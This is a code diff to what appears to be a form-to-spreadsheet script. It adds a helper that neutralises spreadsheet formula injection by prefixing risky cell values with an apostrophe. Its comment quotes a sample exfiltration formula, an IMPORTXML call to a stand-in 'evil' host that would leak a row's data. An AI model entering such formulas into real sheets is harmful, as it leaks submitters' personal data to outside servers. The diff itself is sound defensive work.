@@ -151,7 +151,7 @@ function submitForm(formKey, data) {
   def.fields.forEach(function (f) {
     let v = data[f.name];
     if (Array.isArray(v)) v = v.join(', ');
-    row.push(v == null ? '' : String(v).trim());
+    row.push(sanitizeCell_(v == null ? '' : String(v).trim()));
   });
   row.push(data.consent ? 'Yes' : 'No');  // Consent
   row.push(WEBSITE_URL);                   // Source
@@ -169,6 +169,23 @@ function submitForm(formKey, data) {
 }
 
 /*** 5) HELPERS ***/
+
+/**
+ * Neutralise spreadsheet formula injection.
+ *
+ * Anything a stranger types into a public form lands in a Sheet cell. A value
+ * starting with = + - or @ is parsed as a FORMULA, so a submitted name of
+ * =IMPORTXML("//evil","//x"&A2) executes the moment a staff member opens the
+ * sheet — leaking the row to an outside server. Prefixing with an apostrophe
+ * forces Sheets to treat it as text; the apostrophe is not shown in the cell.
+ * (Same defence as sanitizeCell_ in the votehafiz phone bank.)
+ */
+function sanitizeCell_(v) {
+  if (v == null) return '';
+  if (v instanceof Date || typeof v === 'number' || typeof v === 'boolean') return v;
+  const s = String(v);
+  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
+}
 function headerRow_(def) {
   return ['Timestamp']
     .concat(def.fields.map(function (f) { return f.label; }))
